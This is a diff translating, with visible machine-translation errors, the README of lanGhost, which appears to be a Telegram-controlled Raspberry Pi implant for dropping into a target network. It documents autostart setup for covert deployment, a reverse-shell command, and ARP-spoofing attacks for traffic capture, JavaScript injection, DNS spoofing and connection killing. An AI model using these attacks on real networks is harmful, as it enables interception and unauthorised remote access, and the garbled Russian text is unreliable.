@@ -19,7 +19,7 @@
 
 <h3 align=center><i>Чат-бот Dropbox в локальной сети, управляемый через Telegram</i></h3>
 
-<h1 align=center>features:</h1>
+<h1 align=center>функции:</h1>
 <p align=center>
 <a href="https://github.com/xdavidhu/lanGhost/blob/master/README.MD"><img src="https://raw.githubusercontent.com/xdavidhu/lanGhost/master/img/features.png"/></a>
 </p>
@@ -31,15 +31,15 @@
 <br><br><br>
 </p>
 
-<h1 align=center>installation:</h1>
+<h1 align=center>установка:</h1>
 
-<h3 align=center>warning:</h3>
+<h3 align=center>предупреждение:</h3>
 
-<p align=center>lanGhost is designed for <b>Raspberry Pis</b> (<b>Raspbian</b>/<b>Kali for RPi</b>). Running it on other/desktop distros could cause issues and may not work as excepted.</p>
+<p align=center>lanGhost разработан для <b> Raspberry Pis </b> (<b> Raspbian </b> / <b> Kali для RPi </b>). Запуск его на других / настольных дистрибутивах может вызвать проблемы и может не работать как исключение.</p>
 
-You will need a **Raspberry Pi** with **fresh Raspbian/Kali** on the SD card, because you don't want anything else running in the background.
+Вам понадобится ** Raspberry Pi ** с ** свежим Raspbian / Kali ** на SD-карте, потому что вы не хотите, чтобы что-либо еще работало в фоновом режиме.
 
-Boot up the Pi, get an SSH sell or connect a monitor and a keyboard and enter these commands:
+Загрузите Pi, получите SSH-продажу или подключите монитор и клавиатуру и введите следующие команды:
 
 ```
 $ sudo apt update && sudo apt install python3 python3-pip
@@ -48,34 +48,33 @@ $ cd lanGhost
 $ bash setup.py
 ```
 
-Please **read** the questions/messages while running the setup script!
-
+Пожалуйста, ** прочтите ** вопросы / сообщения при запуске сценария установки!
 <h4>step 1/4 - setup.py</h4>
 
 ```
-[+] Please enter the name of the network interface connected/will
-be connected to the target LAN. Default wired interface is 'eth0',
-and the default wireless interface is 'wlan0' on most systems, but
-you can check it in a different terminal with the 'ifconfig' command.
+[+] Введите имя подключенного сетевого интерфейса / будет
+быть подключенным к целевой LAN. Проводной интерфейс по умолчанию - eth0,
+а беспроводной интерфейс по умолчанию - wlan0 в большинстве систем, но
+вы можете проверить это в другом терминале с помощью команды ifconfig.
 ```
 
-<h4>step 2/4 - setup.py</h4>
+<h4>шаг 2/4 - setup.py</h4>
 
 ```
-[+] Please create a Telegram API key by messaging @BotFather on Telegram
-with the command '/newbot'.
+[+] Создайте ключ API Telegram, отправив сообщение @BotFather в Telegram
+с командой '/newbot'.
 
-After this, @BotFather will ask you to choose a name for your bot.
-This can be anything you want.
+После этого @BotFather попросит вас выбрать имя для вашего бота.
+Это может быть что угодно.
 
-Lastly, @BotFather will ask you for a username for your bot. You have
-to choose a unique username here which ends with 'bot'. For
-example: xdavidbot. Make note of this username, since later
-you will have to search for this to find your bot, which lanGhost
-will be running on.
+Наконец, @BotFather попросит вас указать имя пользователя для вашего бота. У тебя есть
+чтобы выбрать здесь уникальное имя пользователя, которое заканчивается на «бот». За
+пример: xdavidbot. Запишите это имя пользователя, так как позже
+вам нужно будет искать это, чтобы найти своего бота, который lanGhost
+будет работать дальше.
 
-After you send your username of choise to @BotFather, you will recieve
-your API key.
+После того, как вы отправите свое имя пользователя на @BotFather, вы получите
+ваш ключ API.
 ```
 
 <p align=center>
@@ -87,12 +86,12 @@ your API key.
 <h4>step 3/4 - setup.py</h4>
 
 ```
-[+] Now for lanGhost to only allow access to you, you need to verify yourself.
+[+] Теперь, чтобы lanGhost разрешал доступ только вам, вам нужно подтвердить себя.
 
-Send the verification code below TO THE BOT you just created. Just search for your
-bot's @username (what you sent to @BotFather) to find it.
+Отправьте проверочный код, указанный ниже, ТОЧНОМУ, который вы только что создали. Просто найдите свой
+@username бота (то, что вы отправили @BotFather), чтобы найти его.
 
-[+] Verification code to send: ******
+[+] Код подтверждения для отправки: ******
 ```
 
 <p align=center>
@@ -102,13 +101,13 @@ bot's @username (what you sent to @BotFather) to find it.
 <h4>step 4/4 - setup.py</h4>
 
 ```
-[+] Do you want lanGhost to start on boot? This option is necessary if you are using
-this device as a dropbox, because when you are going to drop this device into a
-network, you will not have the chanse to start lanGhost remotely! (autostart works
-by adding a new cron '@reboot' entry)
+[+] Вы хотите, чтобы lanGhost запускался при загрузке? Эта опция необходима, если вы используете
+это устройство как Dropbox, потому что, когда вы собираетесь бросить это устройство в
+сети, у вас не будет возможности запустить lanGhost удаленно! (автозапуск работает
+добавив новую запись cron '@reboot')
 ```
 
-<h3 align=center>If you are ready with the setup just reboot the Pi and lanGhost will start right up!</3>
+<h3 align=center>Если вы готовы с настройкой, просто перезагрузите Pi, и lanGhost запустится!</3>
 <br><br>
 <p align=center>
 <img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-4.png"/>
@@ -180,20 +179,21 @@ Telegram command:
 /reversesh [IP-of-your-listening-server] [PORT]
 ```
 
-<h3>attacks:</h3>
+<h3>нападения:</h3>
 
-  * `/kill` - Stops the internet connectivity for the target.
-  * `/mitm` - Captures HTTP and DNS traffic from the target and sends it in text messages.
-  * `/replaceimg` -  Replaces HTTP images for the target to what picture you send to the bot.
-  * `/injectjs` - Injects JavaScript into every HTTP HTML response for the target. You need to host the the JS file on your server and give the URL as a parameter.
-  * `/spoofdns` - Spoofs DNS responses for the target.
+ * `/ kill` - останавливает подключение к Интернету для цели.
+ * `/ mitm` - захватывает HTTP- и DNS-трафик от цели и отправляет его в текстовых сообщениях.
+ * `/ replaceimg` - Заменяет HTTP-изображения для цели на то, что вы отправляете боту.
+ * `/ injectjs` - внедряет JavaScript в каждый ответ HTTP HTML для цели.
+ Вам необходимо разместить JS-файл на своем сервере и указать URL-адрес в качестве параметра.
+ * `/ spoofdns` - Имитирует ответы DNS для цели.
 
-All attacks use **ARP Spoofing**!
+Все атаки используют ** ARP Spoofing **!
 
-<h3>scans:</h3>
+<h3>сканированиеs:</h3>
 
-  * `/scan` - Scans the local network and returns the hosts online. Uses `nmap -sn` scan to discover hosts.
-  * `/scanip` - Scans an IP address for open ports and other info. Uses `nmap -sS` scan.
+ * `/ scan` - Сканирует локальную сеть и возвращает хосты в оперативный режим. Использует nmap -sn scan для обнаружения хостов.
+ * `/ scanip` - Сканирует IP-адрес на предмет открытых портов и другой информации. Использует сканирование nmap -sS.
 
 <h3>notifications:</h3>
 
